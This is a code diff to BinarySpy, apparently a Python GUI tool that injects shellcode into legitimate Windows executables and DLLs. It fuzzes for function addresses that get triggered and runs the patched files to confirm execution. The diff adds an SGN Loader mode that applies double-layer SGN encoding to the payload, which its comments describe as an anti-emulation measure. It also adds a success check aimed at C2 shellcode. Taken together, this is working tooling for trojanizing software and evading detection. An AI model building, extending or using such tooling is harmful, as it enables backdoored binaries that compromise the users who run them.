@@ -1,7 +1,10 @@
 import tkinter as tk
 import ttkbootstrap as ttk
 from ttkbootstrap.constants import *
-from ttkbootstrap.scrolled import ScrolledText
+try:  # ttkbootstrap >=1.10 迁移至 widgets.scrolled，旧版回退
+    from ttkbootstrap.widgets.scrolled import ScrolledText
+except ImportError:
+    from ttkbootstrap.scrolled import ScrolledText
 from tkinter import filedialog, messagebox
 import tkinter as tk
 import pefile
@@ -17,8 +20,8 @@ import psutil
 import subprocess
 from datetime import datetime
 from queue import Queue
-from zeroeye_python import ZeroEyeWindow
-from sigflip_python import SigFlipWindow
+from core.zeroeye_python import ZeroEyeWindow
+from core.sigflip_python import SigFlipWindow
 
 # --- 语言配置字典 ---
 LANG_CONFIG = {
@@ -31,11 +34,14 @@ LANG_CONFIG = {
         "loader_hint": "(DLL 需要 EXE 加载)",
         "remove_sig_btn": "去除签名",
         "opt_group": "Fuzz & 自动化设置",
-        "test_patch_cb": "使用内置测试补丁 (calc32/64.bin)",
+        "test_patch_cb": "使用内置测试补丁 (testfile/calc32/64.bin)",
         "auto_delete_cb": "自动删除无效的测试文件",
         "mode_label": "Fuzz 模式:",
         "mode_auto": "自动分析 (CFG+调用链+符号执行)",
         "mode_all": "全部 Fuzz (直接测试所有大函数)",
+        "mode_sgn": "SGN Loader",
+        "sgn_encode_cb": "sgn 编码 (关闭=原始 shellcode)",
+        "survival_cb": "存活判定 (C2 shellcode：目标常驻即成功)",
         "sym_exec_cb": "启用符号执行验证",
         "va_label": "手动 VA (Hex):",
         "size_label": "最小函数大小:",
@@ -72,11 +78,14 @@ LANG_CONFIG = {
         "loader_hint": "(DLL needs EXE loader)",
         "remove_sig_btn": "Remove Signature",
         "opt_group": "Fuzz & Automation Settings",
-        "test_patch_cb": "Use Internal Test Patch (calc32/64.bin)",
+        "test_patch_cb": "Use Internal Test Patch (testfile/calc32/64.bin)",
         "auto_delete_cb": "Auto delete failed test files",
         "mode_label": "Fuzz Mode:",
         "mode_auto": "Auto Analysis (CFG+CallChain+SymExec)",
         "mode_all": "Fuzz All (Test all large functions)",
+        "mode_sgn": "SGN Loader",
+        "sgn_encode_cb": "sgn encode (off = raw shellcode)",
+        "survival_cb": "Survival check (C2 shellcode: host stays alive = success)",
         "sym_exec_cb": "Enable Symbolic Execution",
         "va_label": "Manual VA (Hex):",
         "size_label": "Min Func Size:",
@@ -111,11 +120,11 @@ class BinarySpy:
         self.root = root
         self.root.title("BinarySpy")
 
-        # 自适应窗口大小（屏幕的 65% 宽度，70% 高度）
+        # 自适应窗口大小（宽度 46%、高度 82%，保证底部按钮可见）
         screen_width = self.root.winfo_screenwidth()
         screen_height = self.root.winfo_screenheight()
-        window_width = int(screen_width * 0.40)
-        window_height = int(screen_height * 0.65)
+        window_width = int(screen_width * 0.46)
+        window_height = int(screen_height * 0.82)
         x = (screen_width - window_width) // 2
         y = (screen_height - window_height) // 2
         self.root.geometry(f"{window_width}x{window_height}+{x}+{y}")
@@ -129,6 +138,9 @@ class BinarySpy:
         # 符号执行控制
         self.stop_requested = False
         self.sym_exec_state = None  # 保存当前符号执行状态
+
+        # 最近一次 fuzz 命中（同目标可复用为 SGN Loader 候选）
+        self.fuzz_hits = None
 
         # 加载 Logo
         try:
@@ -155,6 +167,9 @@ class BinarySpy:
         self.mode_lbl.config(text=l["mode_label"])
         self.rb_auto.config(text=l["mode_auto"])
         self.rb_all.config(text=l["mode_all"])
+        self.rb_sgn.config(text=l["mode_sgn"])
+        self.cb_sgn_encode.config(text=l["sgn_encode_cb"])
+        self.cb_survival.config(text=l["survival_cb"])
         # 复选框
         self.cb_test.config(text=l["test_patch_cb"])
         self.cb_auto_delete.config(text=l["auto_delete_cb"])
@@ -197,7 +212,7 @@ class BinarySpy:
         self.theme_combo.bind("<<ComboboxSelected>>", lambda e: self.change_theme())
 
         # --- 路径配置 ---
-        self.path_group = ttk.LabelFrame(main_frame, text="", padding="10")
+        self.path_group = ttk.LabelFrame(main_frame, text="")
         self.path_group.pack(fill=tk.X, pady=5)
         self.browse_btns = []
 
@@ -236,7 +251,7 @@ class BinarySpy:
         self.is_dll_target = False
 
         # --- 自动化选项 ---
-        self.opt_group = ttk.LabelFrame(main_frame, text="", padding="10")
+        self.opt_group = ttk.LabelFrame(main_frame, text="")
         self.opt_group.pack(fill=tk.X, pady=5)
 
         # 模式选择
@@ -247,60 +262,72 @@ class BinarySpy:
         self.rb_auto.grid(row=0, column=1, columnspan=3, sticky=tk.W)
         self.rb_all = ttk.Radiobutton(self.opt_group, text="", variable=self.mode_var, value="all", command=self.on_mode_change)
         self.rb_all.grid(row=1, column=1, columnspan=3, sticky=tk.W)
+        self.rb_sgn = ttk.Radiobutton(self.opt_group, text="", variable=self.mode_var, value="sgn", command=self.on_mode_change)
+        self.rb_sgn.grid(row=2, column=1, columnspan=3, sticky=tk.W)
+
+        # SGN Loader 模式：sgn 编码开关（shellcode 复用上方"补丁源"字段）
+        self.sgn_encode_var = tk.BooleanVar(value=True)
+        self.cb_sgn_encode = ttk.Checkbutton(self.opt_group, text="", variable=self.sgn_encode_var)
+        self.cb_sgn_encode.grid(row=3, column=0, columnspan=2, sticky=tk.W)
+
+        # 存活判定：C2 等不弹新进程的 shellcode，目标常驻窗口期即算成功
+        self.survival_var = tk.BooleanVar(value=False)
+        self.cb_survival = ttk.Checkbutton(self.opt_group, text="", variable=self.survival_var)
+        self.cb_survival.grid(row=3, column=2, columnspan=2, sticky=tk.W)
 
         # 测试补丁选项
         self.test_patched_var = tk.BooleanVar(value=False)
         self.cb_test = ttk.Checkbutton(self.opt_group, text="", variable=self.test_patched_var)
-        self.cb_test.grid(row=2, column=0, columnspan=4, sticky=tk.W)
+        self.cb_test.grid(row=4, column=0, columnspan=4, sticky=tk.W)
 
         # 自动删除无效文件
         self.auto_delete_var = tk.BooleanVar(value=True)
         self.cb_auto_delete = ttk.Checkbutton(self.opt_group, text="", variable=self.auto_delete_var)
-        self.cb_auto_delete.grid(row=3, column=0, columnspan=4, sticky=tk.W)
+        self.cb_auto_delete.grid(row=5, column=0, columnspan=4, sticky=tk.W)
 
         # 符号执行选项 (自动分析模式专用)
         self.sym_exec_var = tk.BooleanVar(value=False)
         self.cb_sym_exec = ttk.Checkbutton(self.opt_group, text="", variable=self.sym_exec_var, command=self.on_mode_change)
-        self.cb_sym_exec.grid(row=4, column=0, columnspan=4, sticky=tk.W)
+        self.cb_sym_exec.grid(row=6, column=0, columnspan=4, sticky=tk.W)
 
         # 通用参数：测试延迟和监控进程
         self.delay_lbl = ttk.Label(self.opt_group, text="")
-        self.delay_lbl.grid(row=5, column=0, sticky=tk.W)
+        self.delay_lbl.grid(row=7, column=0, sticky=tk.W)
         self.delay_entry = ttk.Entry(self.opt_group, width=8)
         self.delay_entry.insert(0, "3.5")
-        self.delay_entry.grid(row=5, column=1, padx=5, sticky=tk.W)
+        self.delay_entry.grid(row=7, column=1, padx=5, sticky=tk.W)
 
         self.process_lbl = ttk.Label(self.opt_group, text="")
-        self.process_lbl.grid(row=5, column=2, sticky=tk.W)
+        self.process_lbl.grid(row=7, column=2, sticky=tk.W)
         self.process_entry = ttk.Entry(self.opt_group, width=20)
         self.process_entry.insert(0, "calc.exe,CalculatorApp.exe")
-        self.process_entry.grid(row=5, column=3, padx=5, sticky=tk.W)
+        self.process_entry.grid(row=7, column=3, padx=5, sticky=tk.W)
 
         # 深度和最小大小
         self.depth_lbl = ttk.Label(self.opt_group, text="")
-        self.depth_lbl.grid(row=6, column=0, sticky=tk.W)
+        self.depth_lbl.grid(row=8, column=0, sticky=tk.W)
         self.depth_entry = ttk.Entry(self.opt_group, width=10)
-        self.depth_entry.grid(row=6, column=1, padx=5, sticky=tk.W)
+        self.depth_entry.grid(row=8, column=1, padx=5, sticky=tk.W)
 
         self.size_lbl = ttk.Label(self.opt_group, text="")
-        self.size_lbl.grid(row=6, column=2, sticky=tk.W)
+        self.size_lbl.grid(row=8, column=2, sticky=tk.W)
         self.size_entry = ttk.Entry(self.opt_group, width=10)
-        self.size_entry.grid(row=6, column=3, padx=5, sticky=tk.W)
+        self.size_entry.grid(row=8, column=3, padx=5, sticky=tk.W)
 
         # 符号执行步数 (自动分析模式专用)
         self.steps_lbl = ttk.Label(self.opt_group, text="")
-        self.steps_lbl.grid(row=7, column=0, sticky=tk.W)
+        self.steps_lbl.grid(row=9, column=0, sticky=tk.W)
         self.steps_entry = ttk.Entry(self.opt_group, width=10)
-        self.steps_entry.grid(row=7, column=1, padx=5, sticky=tk.W)
+        self.steps_entry.grid(row=9, column=1, padx=5, sticky=tk.W)
 
         # 手动 VA
         self.va_lbl = ttk.Label(self.opt_group, text="")
-        self.va_lbl.grid(row=7, column=2, sticky=tk.W)
+        self.va_lbl.grid(row=9, column=2, sticky=tk.W)
         self.va_entry = ttk.Entry(self.opt_group, width=15)
-        self.va_entry.grid(row=7, column=3, padx=5, sticky=tk.W)
+        self.va_entry.grid(row=9, column=3, padx=5, sticky=tk.W)
 
         # --- 日志终端 ---
-        self.log_text = tk.Text(main_frame, height=15, state=tk.DISABLED, bg="#1a1a2e", fg="#00ff88", font=("Consolas", 10), insertbackground="#00ff88")
+        self.log_text = tk.Text(main_frame, height=9, state=tk.DISABLED, bg="#1a1a2e", fg="#00ff88", font=("Consolas", 10), insertbackground="#00ff88")
         self.log_text.pack(fill=tk.BOTH, expand=True, pady=10)
 
         # --- 控制区 ---
@@ -327,7 +354,14 @@ class BinarySpy:
 
     def on_mode_change(self):
         """根据模式和符号执行复选框状态切换启用/禁用参数"""
-        is_auto = self.mode_var.get() == "auto"
+        mode = self.mode_var.get()
+        is_auto = mode == "auto"
+        is_sgn = mode == "sgn"
+
+        # SGN Loader 专用控件（shellcode 复用补丁源字段）
+        sgn_state = tk.NORMAL if is_sgn else tk.DISABLED
+        self.cb_sgn_encode.config(state=sgn_state)
+        self.cb_survival.config(state=sgn_state)
 
         # 符号执行复选框只在自动分析模式下可用
         cb_state = tk.NORMAL if is_auto else tk.DISABLED
@@ -362,7 +396,15 @@ class BinarySpy:
         :param detail_only: 仅记录到详细日志文件，不显示在界面
         """
         l = LANG_CONFIG[self.current_lang]
-        msg = l.get(key_or_msg, key_or_msg).format(*args)
+        # B4 修复：仅当 key 命中语言表才做 format，避免消息文本含 {} 时抛 IndexError
+        template = l.get(key_or_msg)
+        if template is not None:
+            try:
+                msg = template.format(*args)
+            except (IndexError, KeyError, ValueError):
+                msg = template
+        else:
+            msg = str(key_or_msg)
         timestamp = datetime.now().strftime("[%H:%M:%S] ")
         
         # 界面日志（非 detail_only）
@@ -389,24 +431,28 @@ class BinarySpy:
         self.root.after(100, self.check_queue)
 
     def stop_sym_exec(self):
-        """停止符号执行并保存当前结果"""
+        """停止当前任务（符号执行 / SGN Loader 等）并保留当前结果"""
         self.stop_requested = True
-        self.log("[*] 正在停止符号执行...")
+        self.log("[*] 正在停止当前任务...")
 
-    def _test_manual_va(self, target_path, patch_path, manual_va):
+    def _test_manual_va(self, ui):
         """手动 VA 模式：直接对指定 VA 进行补丁
         DLL 模式：只生成文件，不运行测试
         EXE 模式：生成文件并运行测试
+        B1：全部输入来自主线程 UI 快照 ui
         """
-        loader_path = self.loader_entry.get().strip()
+        target_path = ui["target"]
+        patch_path = ui["patch"]
+        manual_va = ui["manual_va"]
+        loader_path = ui["loader"]
         l = LANG_CONFIG[self.current_lang]
-        
+
         try:
             # 解析 VA
             try:
                 va = int(manual_va, 16)
             except ValueError:
-                messagebox.showerror(l["msg_error"], 
+                self._ui_messagebox("showerror", l["msg_error"],
                     "无效的 VA 地址，请输入十六进制格式" if self.current_lang == "zh" else "Invalid VA address, please use hex format")
                 return
             
@@ -430,8 +476,8 @@ class BinarySpy:
             self.log(f"[+] PE 架构: {proj.arch.name}, 位宽: {proj.arch.bits}")
             
             # 获取补丁数据
-            if self.test_patched_var.get():
-                p_file = "calc64.bin" if proj.arch.bits == 64 else "calc32.bin"
+            if ui["test_patch"]:
+                p_file = "testfile/calc64.bin" if proj.arch.bits == 64 else "testfile/calc32.bin"
                 if not os.path.exists(p_file):
                     raise Exception(f"Missing {p_file}")
                 with open(p_file, 'rb') as f:
@@ -441,7 +487,8 @@ class BinarySpy:
                 p_data = self.get_patch_data(patch_path)
                 self.log(f"[+] 补丁数据来源: {patch_path}, 大小={len(p_data)} bytes")
             else:
-                messagebox.showwarning("警告" if self.current_lang == "zh" else "Warning",
+                self._ui_messagebox("showwarning",
+                    "警告" if self.current_lang == "zh" else "Warning",
                     "请选择补丁源文件或勾选使用内置测试补丁" if self.current_lang == "zh" else "Please select a patch source or enable test patch")
                 return
             
@@ -472,30 +519,24 @@ class BinarySpy:
                 self.log(f"[*] 请手动运行加载器测试")
                 self.log("=" * 60)
                 
-                messagebox.showinfo(l["msg_success"],
+                self._ui_messagebox("showinfo", l["msg_success"],
                     f"补丁文件已生成:\n{patched_file}\n\n请手动运行加载器测试" if self.current_lang == "zh" else f"Patched file generated:\n{patched_file}\n\nRun loader manually to test")
                 return
             
-            # EXE 模式：运行测试
+            # EXE 模式：运行测试（B2：列表 spawn + 轮询 diff 检测）
             self.log(f"[*] 开始运行测试...")
-            self.kill_calc_processes()
-            
-            startupinfo = subprocess.STARTUPINFO()
-            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-            startupinfo.wShowWindow = subprocess.SW_HIDE
-            
-            p = subprocess.Popen(patched_file, shell=True, startupinfo=startupinfo,
-                                creationflags=subprocess.CREATE_NO_WINDOW)
-            
-            delay = float(self.delay_entry.get().strip() or "3.5")
-            time.sleep(delay)
-            
-            if self.kill_calc_processes():
-                self.log(f"[!!!] 命中成功! VA {hex(va)} 触发了目标进程")
+            delay = float(ui["delay"] or "3.5")
+            monitor_names = self._monitor_names(ui["process"])
+
+            hit, new_procs = self._run_spawn_test(patched_file, delay, monitor_names)
+
+            if hit:
+                triggered = ", ".join(sorted(set(new_procs.values())))
+                self.log(f"[!!!] 命中成功! VA {hex(va)} 触发了目标进程 ({triggered})")
                 self.log(f"[+] 测试成功!")
             else:
                 self.log(f"[.] 未触发目标进程")
-                if self.auto_delete_var.get():
+                if ui["auto_delete"]:
                     try:
                         if self.is_dll_target and os.path.exists(os.path.dirname(patched_file)):
                             shutil.rmtree(os.path.dirname(patched_file))
@@ -504,8 +545,6 @@ class BinarySpy:
                             os.remove(patched_file)
                             self.log(f"[-] 已删除补丁文件")
                     except: pass
-            
-            p.terminate()
             
             self.log("=" * 60)
             self.log(f"[*] 测试完成")
@@ -648,14 +687,138 @@ class BinarySpy:
             except: continue
         return found
 
+    # --- B2 进程管理辅助：列表 spawn / 轮询 diff 检测 / 静置清理 / 进程树整杀 ---
+    @staticmethod
+    def _monitor_names(process_str):
+        """解析逗号分隔的监控进程名，统一小写"""
+        names = [n.strip().lower() for n in (process_str or "calc.exe").split(',') if n.strip()]
+        return names or ["calc.exe"]
+
+    def _monitor_snapshot(self, names):
+        """返回当前监控进程快照 {pid: name}"""
+        targets = set(names)
+        out = {}
+        for proc in psutil.process_iter(['name', 'pid']):
+            try:
+                if proc.info['name'] and proc.info['name'].lower() in targets:
+                    out[proc.info['pid']] = proc.info['name']
+            except Exception:
+                continue
+        return out
+
+    def _wait_monitor_clean(self, names, timeout=8.0):
+        """循环击杀监控进程直至快照为空（处理 calc.exe 存根 -> CalculatorApp 延迟重启链）"""
+        deadline = time.time() + timeout
+        while time.time() < deadline:
+            snap = self._monitor_snapshot(names)
+            if not snap:
+                return True
+            for pid in snap:
+                try:
+                    psutil.Process(pid).kill()
+                except Exception:
+                    continue
+            time.sleep(0.7)
+        return not self._monitor_snapshot(names)
+
+    def _kill_process_tree(self, pid):
+        """递归整杀进程树（含子进程）"""
+        try:
+            parent = psutil.Process(pid)
+        except Exception:
+            return
+        try:
+            for child in parent.children(recursive=True):
+                try:
+                    child.kill()
+                except Exception:
+                    pass
+        except Exception:
+            pass
+        try:
+            parent.kill()
+        except Exception:
+            pass
+
+    def _run_spawn_test(self, exe_path, delay, monitor_names):
+        """
+        B2 修复后的单次 spawn 测试：
+        - 列表参数 Popen：不经 cmd 解析（元字符免疫），文件缺失立刻抛 FileNotFoundError，
+          proc.pid 即目标进程本身（不再被 cmd 包装）；
+        - 检测：spawn 前快照，窗口内轮询 diff 新增监控进程（UWP calc 激活延迟下不漏检）；
+        - 清理：杀掉新增监控进程 + 递归整杀测试进程树。
+        返回 (hit: bool, new_procs: {pid: name})
+        """
+        self._wait_monitor_clean(monitor_names)
+        before = set(self._monitor_snapshot(monitor_names))
+        new_procs = {}
+        proc = None
+        try:
+            startupinfo = subprocess.STARTUPINFO()
+            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+            startupinfo.wShowWindow = subprocess.SW_HIDE
+            proc = subprocess.Popen([exe_path], startupinfo=startupinfo,
+                                    creationflags=subprocess.CREATE_NO_WINDOW)
+        except Exception as e:
+            self.log(f"[!] 启动测试进程失败: {exe_path} ({e})")
+            return False, {}
+
+        t0 = time.time()
+        while time.time() - t0 < delay:
+            snap = self._monitor_snapshot(monitor_names)
+            for pid, nm in snap.items():
+                if pid not in before and pid not in new_procs:
+                    new_procs[pid] = nm
+            if new_procs:
+                break  # 命中即提前收兵
+            time.sleep(0.3)
+
+        hit = len(new_procs) > 0
+        for pid in new_procs:
+            try:
+                psutil.Process(pid).kill()
+            except Exception:
+                pass
+        if proc is not None:
+            self._kill_process_tree(proc.pid)
+        return hit, new_procs
+
+    # --- B1 UI 线程安全辅助 ---
+    def _snapshot_ui(self):
+        """主线程调用：一次性抓取全部 UI 输入值，工作线程只使用这份快照"""
+        return {
+            "target": self.target_entry.get().strip(),
+            "patch": self.patch_entry.get().strip(),
+            "loader": self.loader_entry.get().strip(),
+            "sgn_encode": self.sgn_encode_var.get(),
+            "survival": self.survival_var.get(),
+            "manual_va": self.va_entry.get().strip(),
+            "min_size": self.size_entry.get().strip(),
+            "depth": self.depth_entry.get().strip(),
+            "steps": self.steps_entry.get().strip(),
+            "delay": self.delay_entry.get().strip(),
+            "process": self.process_entry.get().strip(),
+            "test_patch": self.test_patched_var.get(),
+            "auto_delete": self.auto_delete_var.get(),
+            "sym_exec": self.sym_exec_var.get(),
+        }
+
+    def _ui_messagebox(self, kind, title, message):
+        """工作线程弹窗：marshal 到主线程执行（tkinter 非线程安全）"""
+        self.root.after(0, lambda: getattr(messagebox, kind)(title, message))
+
     def start_task(self):
         self.start_btn.config(state=tk.DISABLED)
         self.progress.start()
+        # B1：主线程先抓取 UI 快照再启动工作线程
+        ui = self._snapshot_ui()
         # 根据模式选择工作线程
         if self.mode_var.get() == "auto":
-            threading.Thread(target=self.worker_thread, daemon=True).start()
+            threading.Thread(target=self.worker_thread, args=(ui,), daemon=True).start()
+        elif self.mode_var.get() == "sgn":
+            threading.Thread(target=self.sgn_loader_worker_thread, args=(ui,), daemon=True).start()
         else:
-            threading.Thread(target=self.fuzz_all_worker_thread, daemon=True).start()
+            threading.Thread(target=self.fuzz_all_worker_thread, args=(ui,), daemon=True).start()
 
     def setup_logging(self, target_path):
         """初始化日志系统"""
@@ -905,34 +1068,149 @@ class BinarySpy:
 
         return visited_functions
 
-    def worker_thread(self):
-        target_path = self.target_entry.get().strip()
-        patch_path = self.patch_entry.get().strip()
-        loader_path = self.loader_entry.get().strip()
-        
+    def sgn_loader_worker_thread(self, ui):
+        """SGN Loader 模式工作线程：补丁源(shellcode) → (sgn) → 新增节补丁 → 验证重试"""
+        l = LANG_CONFIG[self.current_lang]
+        target_path = ui["target"]
+
+        def _fail(msg):
+            self._ui_messagebox("showwarning",
+                                "警告" if self.current_lang == "zh" else "Warning", msg)
+            self.root.after(0, lambda: self.start_btn.config(state=tk.NORMAL))
+            self.root.after(0, self.progress.stop)
+
         if not target_path:
-            messagebox.showwarning("警告" if self.current_lang == "zh" else "Warning",
-                                   "请选择目标 PE 文件" if self.current_lang == "zh" else "Please select a target PE file")
+            _fail("请选择目标 PE 文件" if self.current_lang == "zh" else "Please select a target PE file")
+            return
+        try:
+            from core import sgn_loader as sl
+            from core import sgn_wrapper
+            if ui["sgn_encode"] and not sgn_wrapper.find_sgn():
+                raise RuntimeError("未找到 sgn.exe (sgn.exe not found)" if
+                                   self.current_lang == "zh" else "sgn.exe not found")
+        except Exception as e:
+            _fail(f"SGN 环境不可用: {e}" if self.current_lang == "zh"
+                  else f"SGN environment unavailable: {e}")
+            return
+
+        try:
+            arch = sl.detect_arch(target_path)
+            # 停止按钮可用（build_verified 在每次尝试/监控窗口内响应）
+            self.stop_requested = False
+            self.root.after(0, lambda: self.stop_btn.config(state=tk.NORMAL))
+            # shellcode 来源：勾选"内置测试补丁"→ testfile/calc*.bin；否则用补丁源字段
+            if ui["test_patch"]:
+                sc_path = "testfile/calc64.bin" if arch == 64 else "testfile/calc32.bin"
+                if not os.path.isfile(sc_path):
+                    raise FileNotFoundError(f"内置测试补丁缺失: {sc_path}")
+            else:
+                sc_path = ui["patch"]
+                if not sc_path or not os.path.isfile(sc_path):
+                    _fail("请在补丁源选择 shellcode .bin 文件（或勾选内置测试补丁）"
+                          if self.current_lang == "zh" else
+                          "Select a shellcode .bin as patch source (or enable the internal test patch)")
+                    return
+            with open(sc_path, "rb") as f:
+                shellcode = f.read()
+            self.log(f"[*] SGN Loader: target={os.path.basename(target_path)} "
+                     f"arch={arch} shellcode={os.path.basename(sc_path)} ({len(shellcode)}B)")
+            if not shellcode:
+                _fail("shellcode 文件为空" if self.current_lang == "zh" else "Shellcode file is empty")
+                return
+
+            # 候选来源优先级：手动 VA > 同目标 fuzz 命中 > 自动扫描
+            if ui["manual_va"]:
+                cand_vas = [int(ui["manual_va"], 16)]
+                self.log(f"[*] 手动 VA: {cand_vas[0]:#x}")
+            else:
+                if (self.fuzz_hits and self.fuzz_hits["vas"] and
+                        os.path.abspath(self.fuzz_hits["target"]) == os.path.abspath(target_path)):
+                    cand_vas = self.fuzz_hits["vas"]
+                    cand_note = f"fuzz 命中"
+                else:
+                    cands = sl.auto_candidates(target_path, arch)
+                    cand_vas = [c[0] for c in cands]
+                    cand_note = "自动扫描"
+                self.log(f"[*] 候选来源: {cand_note}，共 {len(cand_vas)} 个: "
+                         + ", ".join(f"{v:#x}" for v in cand_vas[:4])
+                         + (" …" if len(cand_vas) > 4 else ""))
+
+            triggers = None
+            if not ui["survival"]:
+                triggers = [s.strip() for s in ui["process"].split(",") if s.strip()] or None
+            else:
+                self.log(f"[*] 判定模式: 存活 —— 目标常驻 {max(4.0, float(ui['delay'] or 6)):.0f}s "
+                         "即成功（C2/无新进程 shellcode 适用），忽略监控进程名")
+            try:
+                watch = max(4.0, float(ui["delay"] or 6))
+            except ValueError:
+                watch = 6.0
+
+            out_dir = os.path.join(os.path.dirname(os.path.abspath(target_path)), "sgn_out")
+            # 每个候选都有机会（无硬上限；崩溃同候选重编码、无 HIT 才换下一个）
+            # sgn_iterations=2：双层编码，sgn 原生防模拟手段（模拟器需连续解码两层）
+            r = sl.build_verified(target_path, cand_vas[0], shellcode, arch, out_dir,
+                                  sgn=ui["sgn_encode"], watch_secs=watch,
+                                  trigger_names=triggers, candidates=cand_vas,
+                                  should_stop=lambda: self.stop_requested,
+                                  sgn_iterations=2, log=self.log)
+            ok = r["ok"]
+            self.log(f"[{'+' if ok else '!'}] SGN Loader 完成: attempts={r['attempts']} "
+                     f"VA={r.get('va', 0):#x} HIT={r['hit']} exit={r['exit']} -> {r['out_path']}")
+            self._ui_messagebox(
+                "showinfo" if ok else "showwarning",
+                l["msg_success"] if ok else l["msg_error"],
+                (f"HIT! 尝试 {r['attempts']} 次 @ {r.get('va', 0):#x}，产物: {r['out_path']}" if ok else
+                 (f"已停止，尝试 {r['attempts']} 次。当前产物: {r['out_path']}"
+                  if self.stop_requested else
+                  f"未达成验证 (HIT={r['hit']}, exit={r['exit']})，尝试 {r['attempts']} 次。\n"
+                  "可关闭 sgn 编码重试，或手动填一个启动早期会被调用的函数 VA。"))
+                if self.current_lang == "zh" else
+                (f"HIT! attempts={r['attempts']} @ {r.get('va', 0):#x}, output: {r['out_path']}" if ok else
+                 (f"Stopped after {r['attempts']} attempts. Last output: {r['out_path']}"
+                  if self.stop_requested else
+                  f"Verification failed (HIT={r['hit']}, exit={r['exit']}), attempts={r['attempts']}.\n"
+                  "Try disabling sgn encode or set a manual VA of a startup-called function.")))
+        except Exception as e:
+            self.log(f"[!] SGN Loader 异常: {e}", level="ERROR")
+            self._ui_messagebox("showerror", l["msg_error"], str(e))
+        finally:
+            self.root.after(0, lambda: self.stop_btn.config(state=tk.DISABLED))
+            self.root.after(0, lambda: self.start_btn.config(state=tk.NORMAL))
+            self.root.after(0, self.progress.stop)
+
+    def worker_thread(self, ui):
+        """B1：输入全部来自主线程 UI 快照 ui，线程内不再读 tkinter 变量"""
+        target_path = ui["target"]
+        patch_path = ui["patch"]
+        loader_path = ui["loader"]
+
+        if not target_path:
+            self._ui_messagebox("showwarning",
+                                "警告" if self.current_lang == "zh" else "Warning",
+                                "请选择目标 PE 文件" if self.current_lang == "zh" else "Please select a target PE file")
             self.root.after(0, lambda: self.start_btn.config(state=tk.NORMAL))
             return
 
         # DLL 模式需要 loader exe（除非填写了手动 VA）
         l = LANG_CONFIG[self.current_lang]
-        manual_va = self.va_entry.get().strip()
+        manual_va = ui["manual_va"]
         if self.is_dll_target and not loader_path and not manual_va:
-            messagebox.showwarning("警告" if self.current_lang == "zh" else "Warning",
-                                   l["need_loader"])
+            self._ui_messagebox("showwarning",
+                                "警告" if self.current_lang == "zh" else "Warning",
+                                l["need_loader"])
             self.root.after(0, lambda: self.start_btn.config(state=tk.NORMAL))
             return
 
         # 手动 VA 模式：直接测试指定地址
         if manual_va:
-            self._test_manual_va(target_path, patch_path, manual_va)
+            self._test_manual_va(ui)
             return
 
-        if not self.test_patched_var.get() and not patch_path:
-            messagebox.showwarning("警告" if self.current_lang == "zh" else "Warning",
-                                   "请选择补丁源文件或勾选使用内置测试补丁" if self.current_lang == "zh" else "Please select a patch source or enable test patch")
+        if not ui["test_patch"] and not patch_path:
+            self._ui_messagebox("showwarning",
+                                "警告" if self.current_lang == "zh" else "Warning",
+                                "请选择补丁源文件或勾选使用内置测试补丁" if self.current_lang == "zh" else "Please select a patch source or enable test patch")
             self.root.after(0, lambda: self.start_btn.config(state=tk.NORMAL))
             return
 
@@ -961,8 +1239,8 @@ class BinarySpy:
             self.log(f"[+] PE 加载成功: 架构={proj.arch.name}, 位宽={proj.arch.bits}, 入口点={hex(proj.entry)}", detail_only=True)
             
             # 获取补丁数据
-            if self.test_patched_var.get():
-                p_file = "calc64.bin" if proj.arch.bits == 64 else "calc32.bin"
+            if ui["test_patch"]:
+                p_file = "testfile/calc64.bin" if proj.arch.bits == 64 else "testfile/calc32.bin"
                 if not os.path.exists(p_file): raise Exception(f"Missing {p_file}")
                 with open(p_file, 'rb') as f: p_data = f.read()
                 self.log(f"[+] 使用内置测试补丁: {p_file}, 大小={len(p_data)} bytes", detail_only=True)
@@ -970,8 +1248,8 @@ class BinarySpy:
                 p_data = self.get_patch_data(patch_path)
                 self.log(f"[+] 补丁数据来源: {patch_path}, 大小={len(p_data)} bytes", detail_only=True)
             
-            min_sz = int(self.size_entry.get() or len(p_data))
-            use_sym_exec = self.sym_exec_var.get()
+            min_sz = int(ui["min_size"] or len(p_data))
+            use_sym_exec = ui["sym_exec"]
             f_hash = self.get_file_hash(target_path)
             c_path = os.path.join(self.cache_dir, f"{f_hash}.cache")
             cfg_path = os.path.join(self.cache_dir, f"{f_hash}_cfg.cache")
@@ -1039,7 +1317,7 @@ class BinarySpy:
             self.log("=" * 60)
 
             # 深度设置：手动优先，否则自动计算
-            manual_depth = self.depth_entry.get().strip()
+            manual_depth = ui["depth"]
             if manual_depth:
                 try:
                     auto_depth = int(manual_depth)
@@ -1071,7 +1349,7 @@ class BinarySpy:
             # 符号执行验证（如果启用）
             if use_sym_exec and valid_targets:
                 # 步数设置：用户输入优先，否则默认100步
-                manual_steps = self.steps_entry.get().strip()
+                manual_steps = ui["steps"]
                 if manual_steps:
                     try:
                         auto_steps = int(manual_steps)
@@ -1148,40 +1426,32 @@ class BinarySpy:
                 
                 self.log(f"[+] 已生成补丁文件: {patched_file}", detail_only=True)
                 self.log(f"[#{i+1}/{test_count}] Testing {name} @ {hex(addr)}")
-                
-                self.kill_calc_processes()
+
+                delay = float(ui["delay"] or "3.5")
+                monitor_names = self._monitor_names(ui["process"])
                 try:
-                    # 隐藏 CMD 窗口，减少 IO 开销
-                    startupinfo = subprocess.STARTUPINFO()
-                    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-                    startupinfo.wShowWindow = subprocess.SW_HIDE
-                    
-                    # DLL 模式：复制 loader exe 到测试目录，然后运行
+                    # DLL 模式：复制 loader exe 到测试目录，测试加载器；EXE 模式直接测补丁文件
+                    exe_to_run = patched_file
                     if self.is_dll_target:
                         test_dir = os.path.dirname(patched_file)
                         loader_name = os.path.basename(loader_path)
                         test_loader = os.path.join(test_dir, loader_name)
-                        # 复制 loader 到测试目录
                         shutil.copy2(loader_path, test_loader)
-                        # 在测试目录中运行 loader
-                        p = subprocess.Popen(f'"{test_loader}"', shell=True, startupinfo=startupinfo,
-                                            creationflags=subprocess.CREATE_NO_WINDOW)
-                    else:
-                        # EXE 模式：直接运行补丁后的文件
-                        p = subprocess.Popen(patched_file, shell=True, startupinfo=startupinfo,
-                                            creationflags=subprocess.CREATE_NO_WINDOW)
-                    
-                    # 使用用户指定的延迟
-                    delay = float(self.delay_entry.get().strip() or "3.5")
-                    time.sleep(delay)
-                    if self.kill_calc_processes():
+                        exe_to_run = test_loader
+
